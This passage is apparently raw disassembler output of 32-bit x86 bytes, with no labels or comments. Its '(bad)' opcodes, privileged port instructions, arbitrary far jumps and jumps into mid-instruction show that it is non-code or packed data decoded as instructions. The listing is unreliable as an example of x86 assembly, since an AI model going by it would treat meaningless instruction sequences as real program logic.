  415955:	and    BYTE PTR [ebp-0x375a7aae],cl
  41595b:	mov    ds:0x55b2cc9a,al
  415960:	fcmovnb st,st(1)
  415962:	das    
  415963:	and    eax,0x2da15fd3
  415968:	xchg   esi,eax
  415969:	pushf  
  41596a:	sbb    bh,ch
  41596c:	push   ss
  41596d:	test   al,0xcd
  41596f:	std    
  415970:	jecxz  0x41597d
  415972:	cmp    eax,0x462e0d4b
  415977:	push   ecx
  415978:	(bad)  
  415979:	cli    
  41597a:	xchg   esp,eax
  41597b:	jmp    0x4159ad
  41597d:	dec    esp
  41597e:	scas   eax,DWORD PTR es:[edi]
  41597f:	jl     0x4159ec
  415981:	pop    ds
  415982:	xchg   edx,eax
  415983:	pop    ss
  415984:	lods   al,BYTE PTR ds:[esi]
  415985:	and    al,0x2f
  415987:	fidivr WORD PTR [eax]
  415989:	xchg   ebx,eax
  41598a:	push   ebp
  41598b:	retf   0x9b93
  41598e:	xchg   BYTE PTR [eax],al
  415990:	jmp    0x415916
  415992:	mov    edi,0xc5ebe17e
  415997:	gs dec ecx
  415999:	(bad)  
  41599a:	loop   0x4159db
  41599c:	inc    ecx
  41599d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41599e:	in     eax,dx
  41599f:	stos   BYTE PTR es:[edi],al
  4159a0:	fld    DWORD PTR [ebp+0x25]
  4159a3:	dec    edi
  4159a4:	rol    esi,cl
  4159a6:	cmp    BYTE PTR [ebp+esi*1+0x2a],0x9d
  4159ab:	mov    ebp,0x1a125402
  4159b0:	ins    BYTE PTR es:[edi],dx
  4159b1:	sub    eax,0x32eb6f4d
  4159b6:	rcr    BYTE PTR [ebx-0x489cad71],0xf9
  4159bd:	or     DWORD PTR [eax-0x78eddd8],esp
  4159c3:	add    dl,bh
  4159c5:	hlt    
  4159c6:	adc    eax,0x322e20b2
  4159cb:	pop    ebx
  4159cc:	pusha  
  4159cd:	repz sbb al,0xe8
  4159d0:	or     al,0xff
  4159d2:	lods   eax,DWORD PTR ds:[esi]
  4159d3:	xchg   esp,eax
  4159d4:	shl    edi,cl
  4159d6:	shr    DWORD PTR [eax+0x4314b2a],0xd2
  4159dd:	pop    esi
  4159de:	add    edi,ebx
  4159e0:	mov    cl,0xa8
  4159e2:	or     al,0x8
  4159e4:	pop    ds
  4159e5:	inc    edx
  4159e6:	push   ebx
  4159e7:	fdiv   DWORD PTR [eax-0x5a270ddb]
  4159ed:	or     eax,0xde724768
  4159f2:	cmp    eax,DWORD PTR [eax+0x7f]
  4159f5:	inc    edx
  4159f6:	aaa    
  4159f7:	pop    ds
  4159f8:	push   ds
  4159f9:	into   
  4159fa:	sub    al,0x57
  4159fc:	test   eax,0xf6340316
  415a01:	adc    al,0xbc
  415a03:	jne    0x4159c0
  415a05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a06:	(bad)  
  415a07:	shl    BYTE PTR [esi+0x6e],1
  415a0a:	arpl   WORD PTR [esi-0x1b],bx
  415a0d:	rcr    BYTE PTR [ebx-0x35a6f3f9],1
  415a13:	bnd jo 0x415a40
  415a16:	je     0x415a15
  415a18:	adc    eax,0x1c2a3c21
  415a1d:	mov    dh,0xe
  415a1f:	and    dl,BYTE PTR [ecx+0x1bd55186]
  415a25:	sbb    al,0x4e
  415a28:	rol    BYTE PTR [edx+0x70],cl
  415a2b:	add    ebp,0xd52395b2
  415a31:	push   ecx
  415a32:	popa   
  415a33:	hlt    
  415a34:	dec    eax
  415a35:	mov    eax,0x39fa9ba1
  415a3a:	jmp    FWORD PTR [ebp+esi*4+0x41]
  415a3e:	ja     0x4159fe
  415a40:	mov    cl,0x7e
  415a42:	sbb    eax,0xb0ba245f
  415a47:	cwde   
  415a48:	dec    edx
  415a49:	aas    
  415a4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a4b:	std    
  415a4c:	mov    edi,0x27821e7d
  415a51:	pop    ecx
  415a52:	inc    BYTE PTR [ebx+edx*2+0x44]
  415a56:	mov    BYTE PTR [ebp-0x72924a88],dh
  415a5c:	int3   
  415a5d:	inc    ecx
  415a5e:	fiadd  WORD PTR [ecx+eiz*2]
  415a61:	dec    edi
  415a62:	mov    ds:0xb16e674f,eax
  415a67:	lds    eax,FWORD PTR [ecx-0x400e7601]
  415a6d:	mov    esi,0x650ef3fe
  415a72:	push   ecx
  415a73:	add    al,0x99
  415a75:	xor    ah,cl
  415a77:	daa    
  415a78:	adc    BYTE PTR [ebx],ch
  415a7a:	mov    dl,0xb2
  415a7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a7d:	or     DWORD PTR [edi+0x60],eax
  415a80:	std    
  415a81:	add    BYTE PTR [ecx+ebx*8],bl
  415a84:	sub    al,0xa4
  415a86:	jl     0x415a42
  415a88:	out    0xc,al
  415a8a:	and    esi,0xd2471fa1
  415a90:	inc    ebp
  415a91:	mov    esp,0x722dea74
  415a96:	mov    DWORD PTR [esp+eax*4-0xbac646a],eax
  415a9d:	pushf  
  415a9e:	or     BYTE PTR [edi+0x742dccc3],0xe8
  415aa5:	mov    al,cl
  415aa7:	repnz mov ds:0x2b5cb713,eax
  415aad:	jns    0x415a5b
  415aaf:	lahf   
  415ab0:	es mov al,bh
  415ab3:	mov    ah,0x1c
  415ab5:	sbb    BYTE PTR [edx],0xff
  415ab8:	jg     0x415b1d
  415aba:	xchg   esp,eax
  415abb:	aam    0xfb
  415abd:	cli    
  415abe:	xchg   ebx,eax
  415abf:	div    ah
  415ac1:	call   0x895b6d75
  415ac6:	mov    esi,0x28dd8848
  415acb:	loop   0x415b3f
  415acd:	jo     0x415a72
  415acf:	cmp    ax,0x17d2
  415ad3:	cmp    ch,al
  415ad5:	std    
  415ad6:	sbb    eax,0xbe14cd9a
  415adb:	jmp    0x8fc579ae
  415ae0:	xchg   edi,eax
  415ae1:	out    0x48,eax
  415ae3:	ins    DWORD PTR es:[edi],dx
  415ae4:	dec    esi
  415ae5:	(bad)  
  415ae6:	js     0x415a77
  415ae8:	xchg   BYTE PTR ss:[esp+ecx*8+0x6a7f658f],dl
  415af0:	lahf   
  415af1:	aaa    
  415af2:	and    eax,0x1e94b0fd
  415af7:	(bad)  
  415af8:	out    dx,eax
  415af9:	test   DWORD PTR [ebx+0x3d0c8ed6],esi
  415aff:	rcr    dl,0x41
  415b02:	rol    edi,cl
  415b04:	cli    
  415b05:	fbld   TBYTE PTR [ebp+0x2c]
  415b08:	cmp    DWORD PTR [edx],ebp
  415b0a:	mov    ds:0x471412fd,eax
  415b0f:	push   cs
  415b10:	add    bh,BYTE PTR [ebx+0x6c193143]
  415b16:	enter  0xc020,0xb6
  415b1a:	mov    bh,0xdc
  415b1c:	leave  
  415b1d:	jle    0x415b55
  415b1f:	mov    dh,0xe0
  415b21:	adc    ecx,ebx
  415b23:	jns    0x415b5e
  415b25:	bound  esi,QWORD PTR [edx+0x11]
  415b28:	loopne 0x415b1c
  415b2a:	sbb    eax,0x660a678e
  415b2f:	or     eax,0x6cdf515f
  415b34:	je     0x415ae8
  415b36:	in     eax,dx
  415b37:	sbb    eax,0x650e3d83
  415b3c:	popa   
  415b3d:	add    BYTE PTR [eax],al
  415b3f:	add    BYTE PTR [eax],al
  415b41:	add    al,al
  415b43:	push   ss
  415b44:	sbb    BYTE PTR [ebx-0x2a],0xdf
  415b48:	fistp  DWORD PTR [edi-0x239a6a81]
  415b4e:	stos   DWORD PTR es:[edi],eax
  415b4f:	cmp    eax,DWORD PTR [edx-0x60]
  415b52:	ins    BYTE PTR es:[edi],dx
  415b53:	fld    DWORD PTR [eax]
  415b55:	add    bl,dh
  415b57:	add    al,0x0
  415b59:	add    BYTE PTR [ebp+0x564f07c8],al
  415b5f:	sbb    DWORD PTR [eax],ebx
  415b61:	outs   dx,DWORD PTR ds:[esi]
  415b62:	sub    BYTE PTR [ebp+0x38],cl
  415b65:	xchg   ebx,eax
  415b66:	div    BYTE PTR [ecx+0x4f683d14]
  415b6c:	jb     0x415b32
  415b6e:	js     0x415b32
  415b70:	sub    al,0x61
  415b72:	pop    ds
  415b73:	ret    
  415b74:	aad    0x8b
  415b76:	rcr    DWORD PTR [ebp-0x3065951e],cl
  415b7c:	jmp    0xd6a6c342
  415b81:	push   ebp
  415b82:	jle    0x415b8c
  415b84:	mov    ds:0x73c091b6,al
  415b89:	push   eax
  415b8a:	in     eax,0x1b
  415b8c:	sbb    eax,0x226457ef
  415b91:	je     0x415bac
  415b93:	jae    0x415b2a
  415b95:	inc    ebp
  415b96:	mov    ch,0x65
  415b98:	fiadd  DWORD PTR [ebx+0x2458b080]
  415b9e:	mov    esi,0x327600b
  415ba3:	imul   ebx,DWORD PTR [ebx],0xfb962f1e
  415ba9:	push   cs
  415baa:	loop   0x415b5e
  415bac:	mov    ecx,0xbbe859d8
  415bb1:	mov    eax,ds:0xbb0fab3d
  415bb6:	sbb    cl,0x9d
  415bb9:	mov    bh,0xef
  415bbb:	xchg   ebx,eax
  415bbc:	adc    ebp,ecx
  415bbe:	jns    0x415bc5
  415bc0:	dec    edx
  415bc1:	(bad)  
  415bc2:	gs push ebx
  415bc4:	sbb    bh,bh
  415bc6:	pop    ds
  415bc7:	lahf   
  415bc8:	push   esp
  415bc9:	inc    edx
  415bca:	scas   eax,DWORD PTR es:[edi]
  415bcb:	jae    0x415b76
  415bcd:	add    dl,BYTE PTR [edi+0x7b903df6]
  415bd3:	mov    al,ds:0xaea173d6
  415bd8:	push   ebx
  415bd9:	test   eax,0x6799188c
  415bde:	pop    esi
  415bdf:	push   esp
  415be0:	outs   dx,DWORD PTR ds:[esi]
  415be1:	fcomp  QWORD PTR [eax-0x7e9d1110]
  415be7:	jo     0x415b7b
  415be9:	xchg   esp,eax
  415bea:	inc    eax
  415beb:	cwde   
  415bec:	cmc    
  415bed:	mov    ebx,0xa154719
  415bf2:	inc    edi
  415bf3:	xor    edx,DWORD PTR [ebp+0x54]
  415bf6:	mov    cl,0xf1
  415bf8:	scas   eax,DWORD PTR es:[edi]
  415bf9:	and    DWORD PTR [ecx+0x16],0xfffffff9
  415bfd:	push   ds
  415bfe:	into   
  415bff:	mov    dh,0x4f
  415c01:	loop   0x415c69
  415c03:	pop    eax
  415c04:	jbe    0x415bea
  415c06:	push   es
  415c07:	or     dh,dl
  415c09:	mov    WORD PTR [edi],?
  415c0b:	push   esi
  415c0c:	push   ds
  415c0d:	cmc    
  415c0e:	mov    dh,0xc6
  415c10:	pop    es
  415c11:	loopne 0x415bcc
  415c13:	xchg   ebp,eax
  415c14:	ror    DWORD PTR [edx-0x201a3b85],0x29
  415c1b:	and    al,0xf8
  415c1d:	inc    esp
  415c1e:	iret   
  415c1f:	push   esp
  415c20:	cmp    DWORD PTR [eax+ebp*1-0x2f77fc6c],0xa73cfded
  415c2b:	fild   QWORD PTR [esi-0x48]
  415c2e:	fadd   st,st(0)
  415c30:	outs   dx,BYTE PTR ds:[esi]
  415c31:	xchg   ebp,eax
  415c32:	mov    eax,0x987c13a8
  415c37:	icebp  
  415c38:	ret    0xf01b
  415c3b:	mov    al,ds:0x485884d9
  415c40:	and    eax,0xf21f8820
  415c45:	rcl    BYTE PTR [esi],cl
  415c47:	leave  
  415c48:	xor    BYTE PTR [eax],dl
  415c4a:	call   0x219f:0xb72b48f2
  415c51:	std    
  415c52:	ret    0x2d09
  415c55:	jne    0x415be3
  415c57:	lea    eax,[esi-0x320c2860]
  415c5d:	idiv   DWORD PTR [ebp-0x75]
  415c60:	aam    0xe0
  415c62:	cmp    al,cl
  415c64:	loope  0x415ce3
  415c66:	(bad)  
  415c67:	cmp    ah,BYTE PTR [esi+ecx*4+0x7e]
  415c6b:	pop    esp
  415c6c:	sahf   
  415c6d:	mov    dl,0xfa
  415c6f:	sub    BYTE PTR [esi+0x3559ab3e],0x16
  415c76:	ds jmp 0xd37e0a6a
  415c7c:	jno    0x415c51
  415c7e:	dec    edi
  415c7f:	cmp    esp,ebx
  415c81:	dec    eax
  415c82:	mul    edx
  415c84:	sbb    ebp,0xffffffde
  415c87:	mov    ds:0xcd9814e2,al
  415c8c:	test   al,0x97
  415c8e:	mov    edi,0xb427d3ab
  415c93:	mov    ch,0xd9
  415c95:	mov    esi,0x3f593036
  415c9a:	pop    edx
  415c9b:	test   ecx,ecx
  415c9d:	loop   0x415cac
  415c9f:	jo     0x415d0e
  415ca1:	mov    al,fs:0x9508c6f3
  415ca7:	mov    ah,BYTE PTR [ebp-0x6cd66376]
  415cad:	fdivp  st(7),st
  415caf:	mov    dh,0x25
  415cb1:	cwde   
  415cb2:	js     0x415c9f
  415cb4:	retf   0x3a0f
  415cb7:	pop    ds
  415cb8:	adc    ebx,DWORD PTR [edi+0x38]
  415cbb:	pop    esp
  415cbc:	pop    es
  415cbd:	pushf  
  415cbe:	js     0x415d3a
  415cc0:	adc    ecx,esi
  415cc2:	popf   
  415cc3:	mov    bl,0x7a
  415cc5:	loope  0x415d2b
  415cc7:	or     cl,cl
  415cc9:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ccb:	inc    ebx
  415ccc:	mov    ah,0xfb
  415cce:	xor    bl,bl
  415cd0:	data16 jo 0x415cd7
  415cd3:	addr16 jae 0x415d09
  415cd6:	pop    edi
  415cd7:	dec    ebx
  415cd8:	xchg   ebp,eax
  415cd9:	push   0x32b9a445
  415cde:	add    eax,0x9d47d1c0
  415ce3:	int3   
  415ce4:	repnz sbb BYTE PTR [edx-0x498814af],bh
  415ceb:	jmp    0x415c86
  415ced:	jmp    0x415ca8
  415cef:	popf   
  415cf0:	mov    DWORD PTR [ecx+0x5a],ecx
  415cf3:	mov    BYTE PTR [eax],cl
  415cf5:	xchg   esi,eax
  415cf6:	pusha  
  415cf7:	jp     0x415d3e
  415cf9:	sub    BYTE PTR [eax+0x4d5d8d30],bl
  415cff:	in     eax,0xae
  415d01:	in     eax,0xaa
  415d03:	pop    ebx
  415d04:	push   ss
  415d05:	in     eax,dx
  415d06:	daa    
  415d07:	add    bh,BYTE PTR [ecx-0x12fb86fc]
  415d0d:	jge    0x415d75
  415d0f:	dec    esp
  415d10:	cmc    
  415d11:	pop    eax
  415d12:	jbe    0x415d02
  415d14:	add    edi,edi
  415d16:	pusha  
  415d17:	pushf  
  415d18:	mov    dh,0xd8
  415d1a:	shl    DWORD PTR ss:[edi],1
  415d1d:	xor    DWORD PTR [edi+edx*8+0x2a],ecx
  415d21:	pop    ss
  415d22:	in     eax,0x8f
  415d24:	mov    al,ds:0x1f321100
  415d29:	popa   
  415d2a:	jmp    0x643f:0x6657acaa
  415d31:	daa    
  415d32:	or     bh,BYTE PTR [ebx]
  415d34:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  415d36:	cmp    eax,edx
  415d38:	mov    edi,0x11b301e4
  415d3d:	mov    al,ds:0xf903e257
  415d42:	or     al,0x10
  415d44:	mov    cl,0xc1
  415d46:	xor    ch,cl
  415d48:	fidivr WORD PTR [edx+eax*8]
  415d4b:	data16 mov BYTE PTR [edx+0x58],dl
  415d4f:	or     ebx,esp
  415d51:	test   eax,0xa487d6f9
  415d56:	cwde   
  415d57:	jb     0x415ce7
  415d59:	sbb    edi,esi
  415d5b:	sbb    edx,0x5c993681
  415d61:	xor    esp,DWORD PTR [edx-0x5200f639]
  415d67:	in     eax,dx
  415d68:	mov    dl,bl
  415d6a:	test   eax,0x6484471b
  415d6f:	push   0xfc482acf
  415d74:	pop    edi
  415d75:	xor    esi,DWORD PTR [ecx]
  415d77:	mov    edi,0x2016141e
  415d7c:	int    0xa3
  415d7e:	fcom   st(6)
  415d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d82:	mov    eax,0x8ccea93a
  415d87:	call   0x5061:0x812dba67
  415d8e:	jp     0x415d23
  415d90:	outs   dx,BYTE PTR ds:[esi]
  415d91:	inc    eax
  415d92:	sbb    bh,BYTE PTR [ebp+0x0]
  415d95:	cmp    eax,0xb3f6fd78
  415d9a:	add    eax,0xcd0c6c79
  415d9f:	fld    DWORD PTR [esi]
  415da1:	jl     0x415e12
  415da3:	push   esp
  415da4:	(bad)  [ebx+edi*2+0x58cbed44]
  415dab:	test   al,0x71
  415dad:	mov    ebp,0x27e31116
  415db2:	pop    ecx
  415db3:	ins    BYTE PTR es:[edi],dx
  415db4:	jp     0x415e06
  415db6:	lds    eax,FWORD PTR [eiz*2+0x6c22565b]
  415dbd:	or     DWORD PTR [edi+0x67],ebx
  415dc0:	adc    eax,0xb99b398f
  415dc5:	mov    ch,0xb5
  415dc7:	jbe    0x415ded
  415dc9:	cmp    dl,al
  415dcb:	mov    eax,ds:0xd3ca7e26
  415dd0:	lea    ecx,[ebp-0x52c681ae]
  415dd6:	mov    ?,ecx
  415dd8:	mov    eax,0x55f8a468
  415ddd:	and    eax,0x1bfdf38e
  415de2:	pop    DWORD PTR [eax-0x7]
  415de5:	add    al,0x43
  415de7:	(bad)  
  415de8:	bound  eax,QWORD PTR [edi+0xa]
  415deb:	adc    ebx,DWORD PTR [edx]
  415ded:	push   ebp
  415dee:	pop    ss
  415def:	sbb    eax,0xcb795fda
  415df4:	pusha  
  415df5:	pop    ss
  415df6:	inc    eax
  415df7:	dec    edx
  415df8:	sbb    al,0x2b
  415dfa:	cwde   
  415dfb:	xchg   esp,eax
  415dfc:	int3   
  415dfd:	loop   0x415dbf
  415dff:	and    eax,0x1aedcb1
  415e04:	or     DWORD PTR ds:0x89c6af8e,edx
  415e0a:	cmp    bh,0x59
  415e0d:	xchg   DWORD PTR [edx-0x4f],esi
  415e10:	mov    dl,0x4
  415e12:	out    dx,al
  415e13:	(bad)  
  415e15:	mov    BYTE PTR [esi+0x39],al
  415e18:	imul   esi,DWORD PTR [eax],0x0
  415e1b:	mov    WORD PTR [ebx-0x30],ss
  415e1e:	call   0x5da7:0x5d031fb5
  415e25:	sub    cl,BYTE PTR [edx+eax*8]
  415e28:	or     eax,0xe886c3b0
  415e2d:	mov    ecx,0x27defcbb
  415e32:	not    BYTE PTR [esi]
  415e34:	sahf   
  415e35:	retf   0xcc07
  415e38:	js     0x415dce
  415e3a:	(bad)  
  415e3b:	fwait
  415e3c:	sbb    BYTE PTR [edx+0x197bb3d1],0xd5
  415e43:	int    0x87
  415e45:	add    DWORD PTR [edx+edi*4],eax
  415e48:	or     ebp,DWORD PTR [edx+0x2e]
  415e4b:	push   es
  415e4c:	fwait
  415e4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e4e:	jg     0x415def
  415e50:	mov    bl,0xb2
  415e52:	sbb    eax,ecx
  415e54:	leave  
  415e55:	ds push ecx
  415e57:	adc    eax,0xaf1d27cf
  415e5c:	pop    esp
  415e5d:	hlt    
  415e5e:	and    BYTE PTR [esi+0x2ad21468],al
  415e64:	fwait
  415e65:	out    dx,eax
  415e66:	int3   
  415e67:	cmp    esp,DWORD PTR [ebx+ecx*8+0x318af053]
  415e6e:	push   ds
  415e6f:	cs das 
  415e71:	add    BYTE PTR [eax+edx*8+0x6a2cf946],dl
  415e78:	sub    esp,eax
  415e7a:	dec    ebp
  415e7b:	rcl    ch,cl
  415e7d:	and    dh,BYTE PTR [ebx+0x26]
  415e80:	lock adc bl,dl
  415e83:	or     dh,BYTE PTR [eax+0x6f5fef5]
  415e89:	shl    BYTE PTR [ebx-0x7],1
  415e8c:	mov    ch,0x6e
  415e8e:	cwde   
  415e8f:	cmp    BYTE PTR [esi-0x7d325696],bl
  415e95:	mov    WORD PTR [edx-0x78],gs
  415e98:	cmp    eax,0x9c1143c6
  415e9d:	pop    ecx
  415e9e:	push   cs
  415e9f:	and    BYTE PTR [ebx+0x15],dl
  415ea2:	cwde   
  415ea3:	push   cs
  415ea4:	mov    ch,0x56
  415ea6:	jmp    0x415eab
  415ea8:	pop    eax
  415ea9:	cmovb  eax,DWORD PTR [edx+0x20ae6f39]
  415eb0:	retf   0x745a
  415eb3:	inc    edx
  415eb4:	add    eax,0xfff5ce86
  415eb9:	bound  edx,QWORD PTR [edi-0x55]
  415ebc:	bound  esp,QWORD PTR [eax-0x20]
  415ebf:	test   DWORD PTR [esi-0x40],esi
  415ec2:	adc    ah,dl
  415ec4:	shl    BYTE PTR [esi*2-0x46819bd0],0x19
  415ecc:	out    0x57,al
  415ece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ecf:	leave  
  415ed0:	sahf   
  415ed1:	pop    esi
  415ed2:	int3   
  415ed3:	int3   
  415ed4:	pop    ss
  415ed5:	outs   dx,DWORD PTR ds:[esi]
  415ed6:	mov    DWORD PTR [ecx],esi
  415ed8:	push   ebx
  415ed9:	icebp  
  415eda:	xchg   esp,eax
  415edb:	outs   dx,BYTE PTR cs:[esi]
  415edd:	sub    al,BYTE PTR [esi]
  415edf:	pop    ebx
  415ee0:	(bad)  
  415ee1:	daa    
  415ee2:	pop    ebx
  415ee3:	sahf   
  415ee4:	jns    0x415f3d
  415ee6:	repnz gs loop 0x415edb
  415eea:	jecxz  0x415f22
  415eec:	push   esp
  415eed:	fs xchg edx,eax
  415eef:	pop    esi
  415ef0:	rol    BYTE PTR [eax],1
  415ef2:	mov    bl,0x20
  415ef4:	int3   
  415ef5:	cmp    DWORD PTR [ebp+0x67],ebx
  415ef8:	in     eax,dx
  415ef9:	dec    edi
  415efa:	pop    esi
  415efb:	rcl    DWORD PTR [eax+0x6b8e8a07],cl
  415f01:	cmp    ecx,ecx
  415f03:	sub    eax,0x4d5fb239
  415f08:	and    dl,al
  415f0a:	xchg   DWORD PTR [ebx-0x4],ebp
  415f0d:	push   ss
  415f0e:	aad    0x78
  415f10:	dec    edx
  415f11:	int    0x5c
  415f13:	test   al,0x60
  415f15:	jg     0x415ee2
  415f17:	inc    eax
  415f18:	pushf  
  415f19:	pop    esi
  415f1a:	ret    
  415f1b:	inc    edi
  415f1c:	pop    ebx
  415f1d:	mov    eax,ds:0x504762
  415f22:	mov    edi,fs
  415f24:	inc    ecx
  415f25:	sub    al,0x68
  415f27:	dec    edx
  415f28:	lock inc esi
  415f2a:	add    BYTE PTR [edx+ecx*2],0x2c
  415f2e:	scas   al,BYTE PTR es:[edi]
  415f2f:	cwde   
  415f30:	cmp    esi,esi
  415f32:	xchg   esp,eax
  415f33:	out    0xcc,eax
  415f35:	lahf   
  415f36:	(bad)  
  415f37:	in     eax,0x9b
  415f39:	adc    al,0xb1
  415f3b:	mov    ds:0xd5ad4ffb,eax
  415f40:	jp     0x415f1a
  415f42:	outs   dx,DWORD PTR ds:[esi]
  415f43:	into   
  415f44:	mov    ah,0xd4
  415f46:	in     al,0x5b
  415f48:	xor    esp,DWORD PTR [esp+ebp*2-0x80]
  415f4c:	out    0x64,eax
  415f4e:	sub    DWORD PTR [ebx-0x5d60a595],esi
  415f54:	xchg   esp,eax
  415f55:	pusha  
  415f56:	pop    ss
  415f57:	stos   BYTE PTR es:[edi],al
  415f58:	fisttp QWORD PTR [edx+0x17db0c53]
  415f5e:	mov    edi,ebx
  415f60:	and    al,0x64
  415f62:	inc    esi
  415f63:	ret    
  415f64:	jecxz  0x415f46
  415f66:	mov    ds:0x6f142ee,al
  415f6c:	mov    cl,0xdc
  415f6e:	xor    BYTE PTR [edx-0x2999d9d6],dh
  415f74:	rcl    ch,1
  415f76:	aam    0x2c
  415f78:	leave  
  415f79:	enter  0x384a,0x1f
  415f7d:	mov    ds:0x420d0594,al
  415f82:	fistp  WORD PTR [edx+0x37c0a7f9]
  415f88:	repnz repnz iret 
  415f8b:	test   al,0x93
  415f8d:	jne    0x415f35
  415f8f:	push   0x2b0242dd
  415f94:	and    cl,ch
  415f96:	into   
  415f97:	outs   dx,DWORD PTR ds:[esi]
  415f98:	or     BYTE PTR ds:[edi],bh
  415f9b:	pop    edi
  415f9c:	jns    0x415fb3
  415f9e:	in     al,0x9e
  415fa0:	(bad)  
  415fa1:	fdiv   QWORD PTR [ebx-0x4b258908]
  415fa7:	inc    ebp
  415fa8:	pusha  
  415fa9:	cs stc 
  415fab:	sub    eax,0x6814d702
  415fb0:	lahf   
  415fb1:	stos   DWORD PTR es:[edi],eax
  415fb2:	cdq    
  415fb3:	es repnz pop eax
  415fb6:	xchg   ebx,eax
  415fb7:	sar    DWORD PTR [ecx],cl
  415fb9:	shr    dl,0xc2
  415fbc:	mov    ah,0xd5
  415fbe:	paddusb mm1,QWORD PTR [esi]
  415fc1:	pop    eax
  415fc2:	add    bh,BYTE PTR [edx+0x77]
  415fc5:	jle    0x415f7e
  415fc7:	jb     0x415f62
  415fc9:	jae    0x415fc3
  415fcb:	hlt    
  415fcc:	fidivr WORD PTR [eax+0x79]
  415fcf:	mov    eax,0x4e9f5e1c
  415fd4:	fucomip st,st(0)
  415fd6:	add    BYTE PTR [ecx],ch
  415fd8:	jmp    0x415fb4
  415fda:	pushf  
  415fdb:	dec    ebx
  415fdc:	or     esp,DWORD PTR [edi-0x4597c7ac]
  415fe2:	cmp    cl,BYTE PTR [ecx-0x45]
  415fe5:	not    DWORD PTR [edx]
  415fe7:	nop
  415fe8:	sub    ah,BYTE PTR [esi-0x2cabe8f8]
  415fee:	inc    edi
  415fef:	sbb    bl,BYTE PTR [eax]
  415ff1:	xchg   esi,eax
  415ff2:	ja     0x415f75
  415ff4:	test   esi,edx
  415ff6:	sti    
  415ff7:	repnz daa 
  415ff9:	add    al,0x92
  415ffb:	push   esp
  415ffc:	arpl   WORD PTR [ecx*1-0x3f683cf6],si
  416003:	sub    al,0xe5
  416005:	cld    
  416006:	int3   
  416007:	or     al,0xa9
  416009:	or     al,0x62
  41600b:	test   DWORD PTR [eax+0x482b854c],ecx
  416011:	mov    ebp,DWORD PTR ds:0x716d55b3
  416017:	cld    
  416018:	sub    eax,0xb8c89bc3
  41601d:	xor    eax,0xbee6f4e3
  416022:	dec    esp
  416023:	xchg   edi,eax
  416024:	jnp    0x416094
  416026:	bound  ebp,QWORD PTR [edi-0xd]
  416029:	clc    
  41602a:	mov    ds:0xfc14be2,al
  41602f:	gs inc esi
  416031:	int    0xa2
  416033:	stos   BYTE PTR es:[edi],al
  416034:	push   0xffffffa7
  416036:	push   edi
  416037:	daa    
  416038:	add    al,cl
  41603a:	test   BYTE PTR [ecx-0x3d33c74f],dh
  416040:	outs   dx,BYTE PTR ds:[esi]
  416041:	mov    eax,ds:0x708d8bad
  416046:	jl     0x416009
  416048:	test   al,0x8b
  41604a:	sbb    eax,0xf7e3
  41604f:	add    BYTE PTR [eax],al
  416051:	add    BYTE PTR [edx],bh
  416053:	jne    0x416091
  416055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416056:	jg     0x416047
  416058:	mov    edx,0xd72f5cfd
  41605d:	jae    0x416089
  41605f:	or     ch,BYTE PTR [edi]
  416061:	scas   al,BYTE PTR es:[edi]
  416062:	pop    edi
  416063:	fiadd  WORD PTR [eax]
  416065:	add    bl,dh
  416067:	add    al,0x0
  416069:	add    BYTE PTR [ecx+0x33],ch
  41606c:	maxps  xmm5,XMMWORD PTR [eax]
  41606f:	sub    edx,DWORD PTR [ecx+0x520d0f2a]
  416075:	jbe    0x416091
  416077:	(bad)  
  416078:	jmp    0x892fdf9c
  41607d:	js     0x41609d
  41607f:	outs   dx,BYTE PTR ds:[esi]
  416080:	pop    ds
  416081:	cmp    eax,edi
  416083:	gs mov dh,0x91
  416086:	adc    DWORD PTR [edx],ecx
  416088:	lods   eax,DWORD PTR ds:[esi]
  416089:	mov    ah,0x9
  41608b:	icebp  
  41608c:	ins    DWORD PTR es:[edi],dx
  41608d:	add    eax,0xe1dc8dce
  416092:	ins    DWORD PTR es:[edi],dx
  416093:	dec    edi
  416094:	and    ebp,DWORD PTR [edx-0x3f]
  416097:	sti    
  416098:	sbb    BYTE PTR [ebp+0x47],bh
  41609b:	into   
  41609c:	jbe    0x416098
  41609e:	push   edi
  41609f:	cmp    esp,DWORD PTR [esi]
  4160a1:	pop    esi
  4160a2:	push   ds
  4160a3:	push   ebp
  4160a4:	jmp    0x763b00ae
  4160a9:	int    0x13
  4160ab:	dec    edx
  4160ac:	mov    al,0xc9
  4160ae:	cmp    bl,cl
  4160b0:	iret   
  4160b1:	xchg   DWORD PTR [edi],esi
  4160b3:	mov    WORD PTR [ebp-0x2c75782e],fs
  4160b9:	jb     0x416114
  4160bb:	sbb    eax,0xc2a10d82
  4160c0:	xor    ebx,edi
  4160c2:	pushf  
  4160c3:	jl     0x41610f
  4160c5:	or     BYTE PTR [esp+ecx*8+0x17],0x56
  4160ca:	or     BYTE PTR [edi+ebx*4+0x60],0xe5
  4160cf:	mov    cl,0x9c
  4160d1:	dec    edi
  4160d2:	mov    ds:0x4566db65,al
  4160d7:	adc    eax,0x8bf217d6
  4160dc:	push   edx
  4160dd:	inc    esi
  4160de:	cmp    BYTE PTR [ebx+edi*8-0x581542fa],al
  4160e5:	pop    ebp
  4160e6:	pop    esi
  4160e7:	dec    ecx
  4160e8:	xchg   BYTE PTR [esi-0x19f954cc],bl
  4160ee:	fucom  st(7)
  4160f0:	test   eax,0xff569433
  4160f5:	ds cmp al,0x0
  4160f8:	in     eax,dx
  4160f9:	das    
  4160fa:	sbb    al,BYTE PTR [esi-0x23]
  4160fd:	mov    DWORD PTR [edx-0x26],edi
  416100:	cmp    edi,DWORD PTR [ecx-0x3b298a34]
  416106:	xor    al,0xf3
  416108:	lods   al,BYTE PTR ds:[esi]
  416109:	fsubr  QWORD PTR [ebp+ecx*4+0x2860c3d7]
  416110:	fcom   QWORD PTR [edi]
  416112:	loop   0x416183
  416114:	dec    esp
  416115:	add    al,0x41
  416117:	mov    dh,bl
  416119:	push   ds
  41611a:	xchg   esp,eax
  41611b:	xor    cl,BYTE PTR [edi]
  41611d:	jl     0x4160f2
  41611f:	cli    
